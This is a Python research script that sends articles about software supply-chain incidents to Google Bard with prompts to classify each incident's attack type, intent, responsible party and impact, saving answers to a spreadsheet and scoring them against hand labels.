articles = {'article13': article13, 'article14': article14,'article14': article15,'article15': article15,'article17': article17, 'article18': article18,'article19': article19,'article22': article22, 'article23': article23, 'article26': article26, 'article27': article27, 'article29': article29, 'article31': article31, 'article32': article32, 'article33': article33, 'article36': article36, 'article37': article37, 'article38': article38,'article39': article39, 'article40': article40, 'article41': article41, 'article42': article42, 'article43': article43, 'article46': article46, 'article48': article48, 'article49': article49, 'article51': article51, 'article53': article53, 'article54': article54,'article57': article57, 'article63': article63, 'article65': article65, 'article66': article66, 'article69': article69}
articles = {'article32': article32, 'article33': article33, 'article36': article36, 'article37': article37, 'article38': article38,'article39': article39, 'article40': article40, 'article41': article41, 'article42': article42, 'article43': article43, 'article46': article46, 'article48': article48, 'article49': article49}
articles = { "article13": article13, 'article19': article19, 'article28': article28,'article29': article29, 'article32': article32, 'article37': article37, 'article38': article38, 'article40': article40, 'article43': article43, 'article46': article46,'article66': article66}
articles = {'article28': article28, 'article29': article29, 'article32': article32, 'article38': article38, 'article40': article40, 'article42': article42, 'article43': article43, 'article46': article46, 'article48': article48, 'article51': article51,'article53': article53, 'article54': article54, 'article57': article57, 'article63': article63, 'article65': article65,'article66': article66, 'article69': article69}
articles = {'article54' :article54}
def compare_lists(list1, list2):
    mismatch_indices = []
    matches = 0

    for i in range(len(list1)):
        
        if isinstance(list1[i], str):
            if str(list1[i]).lower() == str(list2[i]).lower():
                # print(f"list1{i} = {str(list1[i]).lower()}, list2{i} = {str(list2[i]).lower()}")
                matches += 1
            else:
                mismatch_indices.append(i+1)
        
        elif list1[i] == list2[i]:
            matches += 1
        else:
            mismatch_indices.append(i+1)

            
    accuracy = matches / len(list1)

    return mismatch_indices, accuracy

def classification():
    list = [] #list to store the choice from prompts
    i = 1
    workbook = openpyxl.Workbook()
    sheet = workbook.active
    for key, value in articles.items(): #going through each article
        prompt = (f"""
                Classify the attack from the following choices:
                Choice 1: Dev Tooling- Occurs when the development machine, SDK, tool chains, or build kit have been exploited. These exploits often result in the introduction of a backdoor by an attacker to own the development environment.
                Choice 2: Negligence- Occurs due to a lack of adherence to best practices. TypoSquatting attacks are a common type of attack associated with negligence, such as when a developer fails to verify the requested dependency name was correct (spelling, name components, glyphs in use, etc).
                Choice 3: Publishing Infrastructure- Occurs when the integrity or availability of shipment, publishing, or distribution mechanisms and infrastructure are affected. This can result from a number of attacks that permit access to the infrastructure.
                Choice 4: Source Code- Occurs when a source code repository (public or private) is manipulated intentionally by the developer or through a developer or repository credential compromise. Source Code compromise can also occur with intentional introduction of security backdoors and bugs in Open Source code contributions by malicious actors.
                Choice 5: Trust and Signing- Occurs when the signing key used is compromised, resulting in a breach of trust of the software from the open source community or software vendor. This kind of compromise results in the legitimate software being replaced with a malicious, modified version.
                Choice 6: Malicious Maintainer- Occurs when a maintainer, or an entity posing as a maintainer, deliberately injects a vulnerability somewhere in the supply chain or in the source code. This kind of compromise could have great consequences because usually the individual executing the attack is considered trustworthy by many. This category includes attacks from experienced maintainers going rogue, account compromise, and new personas performing an attack soon after they have acquired responsibilities.
                Choice 7: Attack Chaining- Sometimes a breach may be attributed to multiple lapses, with several compromises chained together to enable the attack. The attack chain may include types of supply chain attacks as defined here. However, catalogued attack chains often include other types of compromise, such as social engineering or a lack of adherence to best practices for securing publicly accessible infrastructure components.
                Explain your answer using the given definitions and return the option. Only return JSON format with the keys: 'explanation', 'choice'
                Based on the information provided in the Article given delimited by triple backticks. Article: ```{value}```
                 """)
        
        intent_prompt = (f"""
                Was the root cause of the compromise:
                Option 1: delibrate eg. cyberattack on a system, for example malicious attackers stealign information 
                Option 2: accidental eg. Development incompetence  or a bug/vulnerability found
                Explain your reasoning and select an option. Use a JSON format with the keys: 'Explanation', 'choice'
                Based on the information provided in the Article delimited by triple backticks. Article: ```{value}``` 
                """)
        
        responsibe_prompt = (f"""
                Was the article about an attack or a vulnerability which was not exploited? 
                If it was an attack, who was responisble for the attack?
                Choice 2: Outsider - An attack conducted by an individual or group outside the supply chain, such as a group of terrorists or malicious actors.
                Choice 3: Insider- attack by the developer/someone who was a part of the supply chain
                Choice 4: Unclear
                If it was a vulnerability, return choice 1: Vulnerability  
                Explain your reasoning and chose an option.
                Use a JSON format with the key: 'Explanation', 'Option'.
                Based on the information provided in the Article delimited by triple backticks. Article: ```{value}```
                """)

        
        impact_prompt = (f"""
                Classify the attack from the following choices, remember if it is one or more, choose option 5
                Option 1: Performing data or financial theft- accessing, extraction, alteration, or destruction of data and/or identity/financial theft.
                Option 2: Disabling networks or systems- compromising core functionality, efficiency, or maintainability of the system. Software changes that lead to the product being unusable 
                Option 3: Monitoring organizations or individuals- keeping a track of activities perfomed by organizations or individuals
                Option 4: Causing physical harm or death. 
                Option 5: All of the above/multiple choices- it is a vulnerabilty/exploit that can lead to various or all of impacts from the list. 
                Option 6: Unknown or unclear
                Explain your answer using the given definitions and return the option. Use JSON format with the keys: 'explanation', 'choice'
                Based on the information provided in the Article delimited by triple backticks. Article: ```{value}```
                """)
        
        
        solutions_prompt = (f"""
        Suggest the solutions and learning from the incident. 
        Use JSON format with the keys: 'Solutions/Learnings'
        Based on the information provided in the Article delimited by triple backticks. Article: ```{value}```
        """)
        
        response = Bard(token=token).get_answer(impact_prompt)['content']
        sheet.cell(row=i, column=1).value = key
        sheet.cell(row=i, column=2).value = response
        # print(f"\nArticle {i}\n")
        print(key)
        print(response)
        i += 1
    # workbook.save("bardNature2.xlsx")

        # pattern = r'choice": (\d+)'
        # match = re.search(pattern, response)
        # if match:
        #     list.append(int(match.group(1)))

        # else:
        #     print("No numbers found in string.")
      
    # print(list) 
    # compromise_list1 = [3, 3, 3, 3, 7, 4, 1, 6, 6, 4, 4, 4, 6, 6, 2]

    # list2 = [1, 2, 2, 4, 5]

    # mismatch_indices, accuracy = compare_lists(list, compromise_list1)

    # print("Mismatch Articles: ", mismatch_indices)
    # unknown_list = []
    # for i in range(len(list)):
    #     if list[i] == -1:
    #         unknown_list.append(i+1)
    # print("Unknown Articles: ", unknown_list)
    # print("Accuracy: ", accuracy)

classification()

# numbers = random.sample(range(12, 69), 22)
# article_dict = {}
# a_list = []
# for num in numbers:
#     a_list.append(num)
#     a_list.sort()
# key = 'Article' + str(num)
#     variable_name = 'article' + str(num)
#     locals()[variable_name] = variable_name  # Assign variable name as its value
#     article_dict[key] = globals()[variable_name]

# print(a_list)